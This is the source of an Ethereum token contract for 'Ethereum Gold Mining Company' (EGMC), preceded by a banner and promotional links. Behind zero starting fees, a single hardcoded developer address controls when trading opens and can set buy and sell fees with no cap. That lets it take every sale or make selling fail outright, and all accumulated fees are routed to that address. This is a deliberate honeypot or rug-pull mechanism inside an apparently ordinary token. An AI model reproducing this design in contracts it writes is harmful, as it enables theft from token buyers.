/*
                                                                                               
                                                                                                               
EEEEEEEEEEEEEEEEEEEEEE             GGGGGGGGGGGGG     MMMMMMMM               MMMMMMMM             CCCCCCCCCCCCC
E::::::::::::::::::::E          GGG::::::::::::G     M:::::::M             M:::::::M          CCC::::::::::::C
E::::::::::::::::::::E        GG:::::::::::::::G     M::::::::M           M::::::::M        CC:::::::::::::::C
EE::::::EEEEEEEEE::::E       G:::::GGGGGGGG::::G     M:::::::::M         M:::::::::M       C:::::CCCCCCCC::::C
  E:::::E       EEEEEE      G:::::G       GGGGGG     M::::::::::M       M::::::::::M      C:::::C       CCCCCC
  E:::::E                  G:::::G                   M:::::::::::M     M:::::::::::M     C:::::C              
  E::::::EEEEEEEEEE        G:::::G                   M:::::::M::::M   M::::M:::::::M     C:::::C              
  E:::::::::::::::E        G:::::G    GGGGGGGGGG     M::::::M M::::M M::::M M::::::M     C:::::C              
  E:::::::::::::::E        G:::::G    G::::::::G     M::::::M  M::::M::::M  M::::::M     C:::::C              
  E::::::EEEEEEEEEE        G:::::G    GGGGG::::G     M::::::M   M:::::::M   M::::::M     C:::::C              
  E:::::E                  G:::::G        G::::G     M::::::M    M:::::M    M::::::M     C:::::C              
  E:::::E       EEEEEE      G:::::G       G::::G     M::::::M     MMMMM     M::::::M      C:::::C       CCCCCC
EE::::::EEEEEEEE:::::E       G:::::GGGGGGGG::::G     M::::::M               M::::::M       C:::::CCCCCCCC::::C
E::::::::::::::::::::E        GG:::::::::::::::G     M::::::M               M::::::M        CC:::::::::::::::C
E::::::::::::::::::::E          GGG::::::GGG:::G     M::::::M               M::::::M          CCC::::::::::::C
EEEEEEEEEEEEEEEEEEEEEE             GGGGGG   GGGG     MMMMMMMM               MMMMMMMM             CCCCCCCCCCCCC
                                                                                                              
                                                                                                              
                                                                                              
                                                                          

Docs - https://docs.egmc.info
Twitter - https://twitter.com/EGMC_eth
Telegram - https://t.me/EGMC_eth
Website - https://egmc.info

*/


// SPDX-License-Identifier: unlicense

pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract EGMC {
        string public   name_ = "Ethereum Gold Mining Company"; 
        string public   symbol_ = "EGMC";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1000000000 * 10**decimals;

        uint256 buyFee = 0;
        uint256 sellFee = 0;
        uint256 constant swapAmount = totalSupply / 100;

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
        
        error Permissions();
        
        
    
        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed DEVv,
            address indexed spender,
            uint256 value
        );
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant DEVv = payable(address(0xfc18D78a40fB9EcdaED799ee6bb0e82bDDB9000e));

        bool private swapping;
        bool private tradingOpen;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == DEVv || to == DEVv);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                DEVv.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 FeeAmount = amount * (from == pair ? buyFee : sellFee) / 100;
                amount -= FeeAmount;
                balanceOf[address(this)] += FeeAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == DEVv);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _setFee(uint256 _buy, uint256 _sell) private {
            buyFee = _buy;
            sellFee = _sell;
        }

        function setFee(uint256 _buy, uint256 _sell) external {
            if(msg.sender != DEVv)        
                revert Permissions();
            _setFee(_buy, _sell);
        }
    }